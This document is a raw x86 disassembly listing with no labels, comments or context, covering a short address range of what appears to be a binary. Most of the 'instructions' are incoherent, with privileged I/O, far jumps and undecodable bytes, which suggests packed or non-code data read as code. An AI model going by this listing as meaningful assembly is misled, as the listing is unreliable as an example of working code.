  426df6:	jo     0x426e4b
  426df8:	dec    ebp
  426df9:	arpl   bx,cx
  426dfb:	or     edx,ebp
  426dfd:	call   0x934c:0x94d4d4d
  426e04:	dec    ebp
  426e05:	dec    ebp
  426e06:	dec    ebp
  426e07:	ins    BYTE PTR es:[edi],dx
  426e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e09:	mov    DWORD PTR [esp+edx*8],0x50767701
  426e10:	ja     0x426e01
  426e12:	xor    BYTE PTR [edi-0x11],0x64
  426e16:	mov    ecx,0x5011df58
  426e1b:	sbb    eax,0x86ee6d7c
  426e20:	pop    DWORD PTR [ebx+0x26]
  426e23:	xor    BYTE PTR [edi+0x76],0x80
  426e27:	lock std 
  426e29:	or     DWORD PTR [esi-0x3],eax
  426e2c:	or     al,0xb2
  426e2e:	mov    esi,0x76f0800c
  426e33:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426e3a:	push   edi
  426e3c:	xor    BYTE PTR [edi-0x38],0xaa
  426e40:	das    
  426e41:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426e48:	enter  0x4d0d,0x4d
  426e4c:	or     dh,BYTE PTR [edx+0x778629ba]
  426e52:	mov    edx,0x77804d4d
  426e57:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e5d:	std    
  426e5e:	or     al,0xb2
  426e60:	mov    esi,0x87f0800c
  426e65:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e6c:	add    eax,ecx
  426e6e:	or     eax,0x30804d4d
  426e73:	push   ebx
  426e74:	jl     0x426ec9
  426e76:	jb     0x426e77
  426e78:	sti    
  426e79:	arpl   bp,di
  426e7b:	or     DWORD PTR [edi+0x56],ecx
  426e7e:	lea    ecx,[ebp-0x37287f73]
  426e84:	jl     0x426efd
  426e86:	scas   eax,DWORD PTR es:[edi]
  426e87:	fst    DWORD PTR [edi-0x21]
  426e8a:	adc    DWORD PTR [esi-0x7a],ebx
  426e8d:	pop    DWORD PTR [ebx+0x26]
  426e90:	push   eax
  426e91:	ja     0x426e8a
  426e93:	push   eax
  426e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e95:	jp     0x426ee7
  426e97:	ja     0x426e1b
  426e99:	xor    BYTE PTR [edi+0x7a],0x80
  426e9d:	lock or BYTE PTR [ecx],0x46
  426ea1:	std    
  426ea2:	or     al,0xb2
  426ea4:	mov    esi,0x7af0800c
  426ea9:	adc    BYTE PTR [edi+0x537c5382],0x72
  426eb0:	push   edi
  426eb2:	stos   BYTE PTR es:[edi],al
  426eb3:	dec    ebp
  426eb4:	xlat   BYTE PTR ds:[ebx]
  426eb5:	xor    eax,0x4d29bab2
  426eba:	loopne 0x426ef2
  426ebc:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426ec2:	dec    ebp
  426ec3:	dec    ebp
  426ec4:	xor    BYTE PTR [edi+0x7a],0x80
  426ec8:	lock or BYTE PTR [ecx],0x46
  426ecc:	std    
  426ecd:	or     al,0xb2
  426ecf:	mov    esi,0x7af0800c
  426ed4:	adc    BYTE PTR [edi+0x537c5382],0x72
  426edb:	push   edi
  426edd:	stos   BYTE PTR es:[edi],al
  426ede:	dec    ebp
  426edf:	loopne 0x426f17
  426ee1:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426ee7:	dec    ebp
  426ee8:	loopne 0x426f18
  426eea:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426ef0:	dec    ebp
  426ef1:	dec    ebp
  426ef2:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426ef7:	lea    eax,[eax+0x657f80ef]
  426efd:	in     al,dx
  426efe:	out    dx,eax
  426eff:	push   eax
  426f00:	lock out dx,eax
  426f02:	xor    al,0xaf
  426f05:	xor    BYTE PTR [edi-0x9],0x9
  426f09:	inc    esi
  426f0a:	mov    dl,0xc
  426f0c:	mov    dl,0x86
  426f0e:	or     al,0x80
  426f10:	ja     0x426ec1
  426f12:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426f19:	sub    DWORD PTR [ebx+0x6a],edx
  426f1c:	push   DWORD PTR [edx+0x9eff080]
  426f22:	pop    esp
  426f23:	jg     0x426f3e
  426f25:	dec    edi
  426f26:	std    
  426f27:	aad    0x21
  426f29:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426f2e:	lea    edi,[ebp+ecx*4-0xb]
  426f32:	and    al,0x6f
  426f34:	cmp    BYTE PTR [eax+0x77802177],al
  426f3a:	jno    0x426f89
  426f3c:	xlat   BYTE PTR ds:[ebx]
  426f3d:	cmp    eax,0x4dc8d74d
  426f42:	xlat   BYTE PTR ds:[ebx]
  426f43:	sub    eax,0x4d25d74d
  426f48:	xlat   BYTE PTR ds:[ebx]
  426f49:	sbb    eax,0x8615d74d
  426f4e:	cmp    cl,al
  426f50:	dec    ebp
  426f51:	dec    ebp
  426f52:	push   eax
  426f53:	dec    edi
  426f54:	xor    cl,BYTE PTR ds:0x77804d4d
  426f5a:	cmp    eax,0x8d15dded
  426f5f:	aad    0x1b
  426f61:	xor    BYTE PTR [edi+0x3d],0xed
  426f65:	frstor ds:0x80a1d58d
  426f6b:	dec    edi
  426f6c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f72:	cmp    eax,0xc41d9250
  426f77:	dec    DWORD PTR [ebp-0x29]
  426f7a:	cmp    eax,0x86c8d74d
  426f7f:	mov    WORD PTR [edx+0x4d],gs
  426f82:	dec    ebp
  426f83:	stos   DWORD PTR es:[edi],eax
  426f84:	test   eax,0x35fb70a3
  426f89:	lea    edx,[edi-0x78127880]
  426f8f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f95:	and    al,0x6f
  426f97:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f9b:	cmc    
  426f9c:	and    al,0x6f
  426f9e:	cmp    BYTE PTR [eax-0x287f7489],al
  426fa4:	mov    esp,edx
  426fa6:	or     eax,0x6f242260
  426fab:	cmp    BYTE PTR [ebx-0x4e],dl
  426fae:	scas   al,BYTE PTR es:[edi]
  426faf:	push   ebx
  426fb0:	ret    0x86b2
  426fb3:	or     al,0xb2
  426fb5:	add    ch,BYTE PTR [ecx]
  426fb7:	(bad)  
  426fb8:	cld    
  426fb9:	adc    bh,0xef
  426fbc:	arpl   WORD PTR [edx],si
  426fbe:	xor    BYTE PTR [edi-0x75],0x9
  426fc2:	sete   BYTE PTR [ebp-0x287f7273]
  426fc9:	mov    edx,DWORD PTR [ebx-0x4e]
  426fcc:	push   ebx
  426fcd:	ret    0x2b2
  426fd0:	sub    DWORD PTR [edx-0x300f37a],esi
  426fd6:	adc    bh,0x21
  426fd9:	arpl   WORD PTR [edx],si
  426fdb:	or     DWORD PTR [edi],ecx
  426fdd:	loopne 0x426f6c
  426fdf:	lea    ecx,[ebp-0x7f8e8880]
  426fe5:	xchg   edi,eax
  426fe6:	and    DWORD PTR [eax+0x539befd7],eax
  426fec:	dec    ebp
  426fed:	push   eax
  426fee:	ja     0x426f7b
  426ff0:	dec    edi
  426ff1:	jb     0x426ffc
  426ff3:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426ffa:	out    dx,al
  426ffb:	pop    ebx
  426ffc:	adc    BYTE PTR [edi+0x9],dh
  426fff:	cld    
  427000:	ja     0x42704f
  427002:	aad    0xfc
  427004:	ja     0x427019
  427006:	sbb    esp,edi
  427008:	ja     0x427009
  42700a:	ror    BYTE PTR [ecx],1
  42700c:	loopne 0x427085
  42700e:	dec    DWORD PTR [ecx]
  427010:	loopne 0x426fb9
  427012:	adc    ecx,edi
  427014:	jp     0x426fa3
  427016:	lea    ecx,[ebp-0x1ff68bcd]
  42701c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42701d:	dec    ebp
  42701e:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  427022:	mov    bh,ah
  427024:	ja     0x426ff2
  427026:	or     eax,0xd40d77fc
  42702b:	cld    
  42702c:	ja     0x42707b
  42702e:	jl     0x42702c
  427030:	ja     0x427045
  427032:	sar    esp,cl
  427034:	ja     0x427035
  427036:	push   esp
  427037:	(bad)  
  427038:	ja     0x427039
  42703a:	(bad)  
  42703b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703c:	adc    esp,DWORD PTR [esi+0x4da78f74]
  427042:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427046:	or     eax,0xa78fc40b
  42704b:	int3   
  42704c:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427050:	mov    dl,dh
  427052:	sbb    bl,0x35
  427055:	in     eax,dx
  427056:	out    0x8b,eax
  427058:	lea    ecx,[ecx]
  42705a:	loopne 0x4270d3
  42705c:	or     edi,edx
  42705e:	or     DWORD PTR [edi-0x33],edx
  427061:	lea    ecx,[ebp-0x72e1d073]
  427067:	lea    ecx,[ebp-0x3bf688f0]
  42706d:	inc    DWORD PTR [edi+0x8]
  427070:	lea    ecx,[ebp+0x977108d]
  427076:	div    eax
  427078:	or     DWORD PTR [edi-0x11eff689],ecx
  42707e:	pop    ebx
  42707f:	jnp    0x4270e4
  427081:	test   DWORD PTR [ecx],ecx
  427083:	jmp    0x80a3:0x4d4d4d9e
  42708a:	ja     0x427054
  42708c:	push   ebx
  42708d:	mov    dl,0x80
  42708f:	lock enter 0x5ed,0xd
  427094:	stos   DWORD PTR es:[edi],eax
  427095:	les    esp,FWORD PTR [esi+0x538b7780]
  42709b:	mov    dl,0x80
  42709d:	lock mov edx,DWORD PTR [ebx-0x2]
  4270a1:	mov    dl,0xba
  4270a3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4270a9:	test   eax,0x8d21fb70
  4270ae:	xchg   edi,eax
  4270af:	add    BYTE PTR [edi+0x7cc587ed],0x77
  4270b6:	mov    dh,dh
  4270b8:	and    al,0x6f
  4270ba:	cmp    cl,dh
  4270bc:	cmc    
  4270bd:	and    al,0x6f
  4270bf:	cmp    BYTE PTR [eax-0x69],dl
  4270c2:	mov    eax,DWORD PTR [eax+0x77501577]
  4270c8:	adc    eax,0x80157780
  4270cd:	int    0x2e
  4270cf:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  4270d5:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  4270dc:	lea    eax,[eax+0x657dec30]
  4270e2:	xchg   ebx,eax
  4270e3:	push   eax
  4270e4:	lock stc 
  4270e6:	xor    BYTE PTR [edi-0x76],0x80
  4270ea:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  4270f1:	out    0x2f,al
  4270f3:	push   ebx
  4270f4:	jl     0x4270a8
  4270f6:	xchg   BYTE PTR [ebx+eiz*4],cl
  4270f9:	push   ebx
  4270fa:	adc    DWORD PTR [edx-0x4d00d646],esi
  427100:	push   eax
  427101:	ja     0x427085
  427103:	xor    BYTE PTR [edi-0x76],0x80
  427107:	lock mov dl,BYTE PTR [ebx+0x7c]
  42710b:	mov    dl,0x86
  42710d:	or     al,0x53
  42710f:	adc    DWORD PTR [edx-0x4d00d646],esi
  427115:	push   eax
  427116:	ja     0x42709c
  427118:	xor    BYTE PTR [edi-0x7],0x80
  42711c:	ins    DWORD PTR es:[edi],dx
  42711d:	or     ch,ch
  42711f:	xchg   BYTE PTR [ecx],ah
  427121:	push   eax
  427122:	ja     0x42711b
  427124:	xor    BYTE PTR [edi-0x7],0x80
  427128:	ins    DWORD PTR es:[edi],dx
  427129:	pop    ebp
  42712a:	xor    al,0xf9
  42712d:	jge    0x42717e
  42712f:	xchg   edx,eax
  427130:	xchg   ebp,eax
  427131:	xor    BYTE PTR [edi-0x7],0xd5
  427135:	sbb    eax,0x805d6d80
  42713a:	lock stc 
  42713c:	cmp    BYTE PTR [edi-0x6b],0x7d
  427140:	dec    ebx
  427141:	div    DWORD PTR [ebx]
  427143:	std    
  427144:	xor    BYTE PTR [edi-0x7],0x80
  427148:	ins    DWORD PTR es:[edi],dx
  427149:	pop    ebp
  42714a:	in     al,dx
  42714b:	mov    dl,0xc4
  42714d:	in     al,dx
  42714e:	sub    BYTE PTR [ebp-0x6b],0x50
  427152:	ja     0x4270da
  427154:	xor    BYTE PTR [edi-0x76],0x80
  427158:	lock mov dl,BYTE PTR [ebx+0x7c]
  42715c:	push   ebx
  42715d:	adc    DWORD PTR [edx-0x454df37a],esi
  427163:	sub    edi,edi
  427165:	mov    dl,0x50
  427167:	ja     0x42717e
  427169:	xor    BYTE PTR [edi-0x76],0x80
  42716d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427171:	push   ebx
  427172:	adc    DWORD PTR [edx-0x794dd646],esi
  427178:	or     al,0xff
  42717a:	mov    dl,0x50
  42717c:	ja     0x427193
  42717e:	xor    BYTE PTR [edi-0x76],0x80
  427182:	lock mov dl,BYTE PTR [ebx+0x11]
  427186:	push   ebx
  427187:	jl     0x42713b
  427189:	mov    edx,0xc86b229
  42718e:	push   DWORD PTR [edx+0x5071f080]
  427194:	cmp    dl,BYTE PTR [eax-0x69]
  427197:	adc    eax,0xf415777c
  42719c:	and    al,0x6f
  42719e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a2:	repz and al,0x6f
  4271a5:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a9:	cli    
  4271aa:	and    al,0x6f
  4271ac:	cmp    BYTE PTR [esi-0x727290c9],bh
  4271b2:	xor    BYTE PTR [edi-0x76],0x80
  4271b6:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271ba:	push   ebx
  4271bb:	adc    DWORD PTR [edx-0x454df37a],esi
  4271c1:	sub    edi,edi
  4271c3:	mov    dl,0x50
  4271c5:	ja     0x42714b
  4271c7:	xor    BYTE PTR [edi-0x7a],0xec
  4271cb:	ja     0x4271ee
  4271cd:	push   eax
  4271ce:	ja     0x427152
  4271d0:	dec    ebp
  4271d1:	xlat   BYTE PTR ds:[ebx]
  4271d2:	or     BYTE PTR [ebp-0x29],0x21
  4271d6:	xor    al,0xf9
  4271d9:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  4271df:	ja     0x4271f6
  4271e1:	xor    BYTE PTR [edi+0x15],0x4f
  4271e5:	push   0xffffffd5
  4271e7:	(bad)  
  4271e8:	xor    BYTE PTR [edi-0x7e],0x50
  4271ec:	ja     0x427171
  4271ee:	xor    BYTE PTR [edi-0x7d],0x80
  4271f2:	lock and DWORD PTR [ebx-0x4e],eax
  4271f6:	push   eax
  4271f7:	ja     0x42717c
  4271f9:	xor    BYTE PTR [edi+0x15],0x80
  4271fd:	lock adc eax,0xec716d80
  427203:	xchg   edx,eax
  427204:	and    DWORD PTR [eax-0x29c7c10],eax
  42720a:	in     al,0x19
  42720c:	xor    BYTE PTR [edi+0x15],0x80
  427210:	ins    DWORD PTR es:[edi],dx
  427211:	and    DWORD PTR [eax-0x6d13ea10],eax
  427217:	out    dx,eax
  427218:	xor    al,0x83
  42721b:	inc    ebx
  42721c:	mov    dl,0xbe
  42721e:	and    ch,BYTE PTR [edi]
  427220:	lea    ecx,[ebp+0x6f24f6fa]
  427226:	cmp    BYTE PTR [eax-0x29],dl
  427229:	scas   eax,DWORD PTR es:[edi]
  42722a:	jl     0x4272a3
  42722c:	std    
  42722d:	cmc    
  42722e:	and    al,0x6f
  427230:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  427234:	hlt    
  427235:	and    al,0x6f
  427237:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  42723b:	repz and al,0x6f
  42723e:	cmp    BYTE PTR [ecx],al
  427240:	ja     0x4271f1
  427242:	push   eax
  427243:	ja     0x42720d
  427245:	add    DWORD PTR [edi-0x3],esi
  427248:	push   eax
  427249:	ja     0x42727d
  42724b:	add    DWORD PTR [edi+0x76],esi
  42724e:	push   eax
  42724f:	ja     0x427266
  427251:	add    DWORD PTR [edi+0x6a],esi
  427254:	push   eax
  427255:	ja     0x4271de
  427257:	xor    BYTE PTR [edi-0x76],0x80
  42725b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42725f:	push   ebx
  427260:	adc    DWORD PTR [edx-0x454df37a],esi
  427266:	sub    edi,edi
  427268:	mov    dl,0x50
  42726a:	ja     0x4271ef
  42726c:	mov    esi,0x8d8decfe
  427271:	mov    ds:0x6f24f30d,al
  427276:	cmp    BYTE PTR [ecx],cl
  427278:	shld   esp,ebp,0x8d
  42727c:	(bad)  
  42727d:	loop   0x4272a0
  42727f:	dec    ebp
  427280:	xlat   BYTE PTR ds:[ebx]
  427281:	add    BYTE PTR [ecx],0x77
  427284:	bound  ecx,QWORD PTR [edx]
  427286:	xchg   BYTE PTR [ecx],cl
  427288:	test   al,0x4d
  42728a:	dec    ebp
  42728b:	xor    BYTE PTR [edi-0x75],0x80
  42728f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427293:	push   ebx
  427294:	adc    DWORD PTR [edx-0x794dd646],esi
  42729a:	or     al,0xff
  42729c:	mov    dl,0x50
  42729e:	ja     0x427224
  4272a0:	push   eax
  4272a1:	xlat   BYTE PTR ds:[ebx]
  4272a2:	jp     0x427312
  4272a4:	out    0x7a,eax
  4272a6:	xor    BYTE PTR [edi+0x7a],0xb2
  4272aa:	xchg   BYTE PTR [ebx+edx*2],cl
  4272ad:	(bad)  
  4272ae:	mov    dl,0x2
  4272b0:	sub    edi,edi
  4272b2:	xor    dl,BYTE PTR [eax-0x29]
  4272b5:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  4272bc:	push   ebx
  4272bd:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4272c3:	mov    dl,0x86
  4272c5:	or     al,0xff
  4272c7:	mov    dl,0x80
  4272c9:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  4272d0:	push   ebx
  4272d1:	xchg   esp,eax
  4272d2:	mov    dl,0xbe
  4272d4:	or     al,0xb2
  4272d6:	clc    
  4272d7:	sub    edi,edi
  4272d9:	(bad)  
  4272da:	in     al,dx
  4272db:	mov    dl,0x80
  4272dd:	lock adc DWORD PTR [eax-0x29],0x66
  4272e2:	arpl   bp,di
  4272e4:	xlat   BYTE PTR ds:[ebx]
  4272e5:	sub    DWORD PTR [eax-0xf7f7489],eax
  4272eb:	mov    edx,DWORD PTR [ebx+0x7c]
  4272ee:	push   ebx
  4272ef:	adc    DWORD PTR [edx-0x454df37a],esi
  4272f5:	sub    edi,edi
  4272f7:	mov    dl,0xa
  4272f9:	loop   0x42731c
  4272fb:	add    DWORD PTR [edi+0x62],esi
  4272fe:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  427304:	xor    BYTE PTR [edi-0x76],0x80
  427308:	lock mov dl,BYTE PTR [ebx+0x7c]
  42730c:	push   ebx
  42730d:	adc    DWORD PTR [edx-0x794dd646],esi
  427313:	or     al,0xff
  427315:	mov    dl,0x80
  427317:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  42731c:	sub    DWORD PTR [eax-0xf7f7589],eax
  427322:	mov    dl,BYTE PTR [ebx+0x7c]
  427325:	push   ebx
  427326:	adc    DWORD PTR [edx-0x454df37a],esi
  42732c:	sub    edi,edi
  42732e:	mov    dl,0xa
  427330:	loop   0x427353
  427332:	add    DWORD PTR [edi+0x62],esi
  427335:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  42733b:	xor    BYTE PTR [edi-0x38],0x80
  42733f:	lock enter 0x3080,0x80
  427344:	lea    edx,[ebx+0x11]
  427347:	push   ebx
  427348:	jl     0x4272fc
  42734a:	mov    edx,0xc86b229
  42734f:	push   DWORD PTR [edx+0x622f758f]
  427355:	xor    al,0x8a
  427358:	adc    BYTE PTR [edi+0x532a538a],0x94
  42735f:	mov    dl,0xbe
  427361:	or     al,0xb2
  427363:	clc    
  427364:	sub    DWORD PTR [ecx],ecx
  427366:	loopne 0x4273d2
  427368:	(bad)  
  427369:	(bad)  
  42736a:	arpl   WORD PTR [edx+0xca20f09],si
  427370:	lea    ecx,[ebp-0x7fcd8880]
  427376:	lock xor al,BYTE PTR [eax+0x538d8030]
  42737d:	adc    DWORD PTR [ebx+0x7c],edx
  427380:	mov    dl,0xba
  427382:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427388:	(bad)  
  427389:	jne    0x4273ba
  42738b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427391:	mov    dl,BYTE PTR [ebx+0x2a]
  427394:	push   ebx
  427395:	xchg   esp,eax
  427396:	mov    dl,0xbe
  427398:	or     al,0xb2
  42739a:	clc    
  42739b:	sub    DWORD PTR [ecx],ecx
  42739d:	loopne 0x427409
  42739f:	(bad)  
  4273a0:	(bad)  
  4273a1:	arpl   WORD PTR [edx+0xcda0f09],si
  4273a7:	lea    ecx,[ebp-0x7fea8880]
  4273ad:	lock adc eax,0x8d803080
  4273b3:	push   ebx
  4273b4:	adc    DWORD PTR [ebx+0x7c],edx
  4273b7:	mov    dl,0xba
  4273b9:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273bf:	(bad)  
  4273c0:	jne    0x4273f1
  4273c2:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273c8:	mov    dl,BYTE PTR [ebx+0x2a]
  4273cb:	push   ebx
  4273cc:	xchg   esp,eax
  4273cd:	mov    dl,0xbe
  4273cf:	or     al,0xb2
  4273d1:	clc    
  4273d2:	sub    DWORD PTR [ecx],ecx
  4273d4:	loopne 0x427440
  4273d6:	(bad)  
  4273d7:	(bad)  
  4273d8:	arpl   WORD PTR [edx+0xc130f09],si
  4273de:	lea    ecx,[ebp-0x7f788880]
  4273e4:	lock xchg DWORD PTR [eax+0x538d8030],eax
  4273eb:	adc    DWORD PTR [ebx+0x7c],edx
  4273ee:	mov    dl,0xba
  4273f0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273f6:	(bad)  
  4273f7:	jne    0x427428
  4273f9:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273ff:	mov    dl,BYTE PTR [ebx+0x2a]
  427402:	push   ebx
  427403:	xchg   esp,eax
  427404:	mov    dl,0xbe
  427406:	or     al,0xb2
  427408:	clc    
  427409:	sub    DWORD PTR [ecx],ecx
  42740b:	loopne 0x427477
  42740d:	(bad)  
  42740e:	(bad)  
  42740f:	arpl   WORD PTR [edx+0x3a830f09],si
  427415:	lea    ecx,[ebp-0x7fcd8880]
  42741b:	lock xor al,BYTE PTR [eax+0x538d8030]
  427422:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427428:	mov    dl,0x86
  42742a:	or     al,0xff
  42742c:	mov    dl,0x8f
  42742e:	jne    0x42745f
  427430:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427436:	adc    BYTE PTR [edi+0x539080c8],0x2a
  42743d:	mov    dl,0xbe
  42743f:	or     al,0x53
  427441:	xchg   esp,eax
  427442:	mov    dl,0xf8
  427444:	sub    edi,edi
  427446:	dec    BYTE PTR [edi-0x2b9d30cf]
  42744c:	mov    dl,0x80
  42744e:	lock adc eax,0x97803080
  427454:	adc    eax,0x2a539080
  427459:	mov    dl,0xbe
  42745b:	or     al,0x53
  42745d:	xchg   esp,eax
  42745e:	mov    dl,0xf8
  427460:	sub    edi,edi
  427462:	dec    BYTE PTR [edi-0x599d30cf]
  427468:	mov    dl,0x80
  42746a:	lock enter 0x3080,0x80
  42746f:	xchg   edi,eax
  427470:	enter  0x9080,0x53
  427474:	sub    dl,BYTE PTR [ebx-0x6c]
  427477:	mov    dl,0xbe
  427479:	or     al,0xb2
  42747b:	clc    
  42747c:	sub    edi,edi
  42747e:	dec    BYTE PTR [edi-0x29a930cf]
  427484:	std    
  427485:	or     DWORD PTR [edi-0x43],ecx
  427488:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42748e:	xor    al,0x15
  427491:	xor    BYTE PTR [eax],0x80
  427494:	lea    edx,[ebx+0x11]
  427497:	mov    dl,0xba
  427499:	sub    DWORD PTR [ebx+0x7c],edx
  42749c:	mov    dl,0x86
  42749e:	or     al,0xff
  4274a0:	mov    dl,0x8f
  4274a2:	jne    0x4274d3
  4274a4:	bound  eax,QWORD PTR [eax+0x308032f0]
  4274aa:	adc    BYTE PTR [edi+0x53908032],0x2a
  4274b1:	mov    dl,0xbe
  4274b3:	or     al,0x53
  4274b5:	xchg   esp,eax
  4274b6:	mov    dl,0xf8
  4274b8:	sub    edi,edi
  4274ba:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274c0:	mov    dl,0x80
  4274c2:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4274c9:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4274d0:	push   ebx
  4274d1:	xchg   esp,eax
  4274d2:	mov    dl,0xf8
  4274d4:	sub    edi,edi
  4274d6:	dec    BYTE PTR [edi-0x599d30cf]
  4274dc:	mov    dl,0x80
  4274de:	lock xor al,BYTE PTR [eax+0x32978030]
  4274e5:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4274ec:	mov    esi,0x29f8b20c
  4274f1:	(bad)  
  4274f2:	dec    BYTE PTR [edi-0x29a930cf]
  4274f8:	std    
  4274f9:	or     DWORD PTR [edi-0x38],ecx
  4274fc:	lea    ecx,[ebp-0x78887f73]
  427502:	xor    al,0x87
  427505:	xor    BYTE PTR [eax],0x80
  427508:	lea    edx,[ebx+0x11]
  42750b:	mov    dl,0xba
  42750d:	sub    DWORD PTR [ebx+0x7c],edx
  427510:	mov    dl,0x86
  427512:	or     al,0xff
  427514:	mov    dl,0x8f
  427516:	jne    0x427547
  427518:	bound  eax,QWORD PTR [eax+0x308015f0]
  42751e:	adc    BYTE PTR [edi+0x53908015],0x2a
  427525:	mov    dl,0xbe
  427527:	or     al,0x53
  427529:	xchg   esp,eax
  42752a:	mov    dl,0xf8
  42752c:	sub    edi,edi
  42752e:	dec    BYTE PTR [edi-0x2b9d30cf]
  427534:	mov    dl,0x80
  427536:	lock enter 0x3080,0x80
  42753b:	xchg   edi,eax
  42753c:	enter  0x9080,0x53
  427540:	sub    dh,BYTE PTR [edx-0x6bacf342]
  427546:	mov    dl,0xf8
  427548:	sub    edi,edi
  42754a:	dec    BYTE PTR [edi-0x599d30cf]
  427550:	mov    dl,0x80
  427552:	lock adc eax,0x97803080
  427558:	adc    eax,0x2a539080
  42755d:	push   ebx
  42755e:	xchg   esp,eax
  42755f:	mov    dl,0xbe
  427561:	or     al,0xb2
  427563:	clc    
  427564:	sub    edi,edi
  427566:	dec    BYTE PTR [edi-0x29a930cf]
  42756c:	std    
  42756d:	or     DWORD PTR [edi-0x33],ecx
  427570:	lea    ecx,[ebp-0x78887f73]
  427576:	xor    al,0x87
  427579:	xor    BYTE PTR [eax],0x80
  42757c:	lea    edx,[ebx+0x11]
  42757f:	mov    dl,0xba
  427581:	sub    DWORD PTR [ebx+0x7c],edx
  427584:	mov    dl,0x86
  427586:	or     al,0xff
  427588:	mov    dl,0x8f
  42758a:	jne    0x4275bb
  42758c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427592:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427599:	mov    dl,0xbe
  42759b:	or     al,0x53
  42759d:	xchg   esp,eax
  42759e:	mov    dl,0xf8
  4275a0:	sub    edi,edi
  4275a2:	dec    BYTE PTR [edi-0x2b9d30cf]
  4275a8:	mov    dl,0x80
  4275aa:	lock xor al,BYTE PTR [eax+0x32978030]
  4275b1:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4275b8:	push   ebx
  4275b9:	xchg   esp,eax
  4275ba:	mov    dl,0xf8
  4275bc:	sub    edi,edi
  4275be:	dec    BYTE PTR [edi-0x599d30cf]
  4275c4:	mov    dl,0x80
  4275c6:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4275cd:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4275d4:	mov    esi,0x29f8b20c
  4275d9:	(bad)  
  4275da:	dec    BYTE PTR [edi-0x29a930cf]
  4275e0:	std    
  4275e1:	xlat   BYTE PTR ds:[ebx]
  4275e2:	jno    0x4275e5
  4275e4:	ja     0x427648
  4275e6:	or     al,BYTE PTR [esi+0x4d4dac84]
  4275ec:	xor    al,0x5e
  4275ef:	arpl   WORD PTR [edx+0x778017d5],si
  4275f5:	mov    al,BYTE PTR [eax+0x11538af0]
  4275fb:	push   ebx
  4275fc:	jl     0x4275b0
  4275fe:	mov    edx,0xc86b229
  427603:	push   DWORD PTR [edx-0x7f7b88b0]
  427609:	ja     0x427596
  42760b:	adc    bh,0x8b
  42760e:	xor    BYTE PTR [edi-0x75],0x80
  427612:	lock mov edx,DWORD PTR [ebx+0x4b]
  427616:	push   ebx
  427617:	je     0x4275cb
  427619:	mov    BYTE PTR [edx+esi*4],cl
  42761c:	test   BYTE PTR [ecx],ch
  42761e:	push   DWORD PTR [edx]
  427620:	in     al,dx
  427621:	xlat   BYTE PTR ds:[ebx]
  427622:	data16 xor BYTE PTR [edi+0x7a],0x53
  427627:	sub    ch,ch
  427629:	mov    edx,0x8a84ed8a
  42762e:	mov    dl,0x88
  427630:	sub    esp,ebp
  427632:	std    
  427633:	inc    DWORD PTR ds:0x24f60ba2
  427639:	outs   dx,DWORD PTR ds:[esi]
  42763a:	cmp    BYTE PTR [eax-0xf7f7589],al
  427640:	mov    dl,BYTE PTR [ebx+0x11]
  427643:	push   ebx
  427644:	jl     0x4275f8
  427646:	mov    edx,0xc86b229
  42764b:	push   DWORD PTR [edx+0x6384f080]
  427651:	std    
  427652:	or     DWORD PTR [edi],ecx
  427654:	pop    ds
  427655:	mov    cl,BYTE PTR [ebp+0x4d]
  427658:	xor    BYTE PTR [edi-0x76],0x80
  42765c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427660:	push   ebx
  427661:	adc    DWORD PTR [edx-0x794dd646],esi
  427667:	or     al,0xff
  427669:	mov    dl,0x80
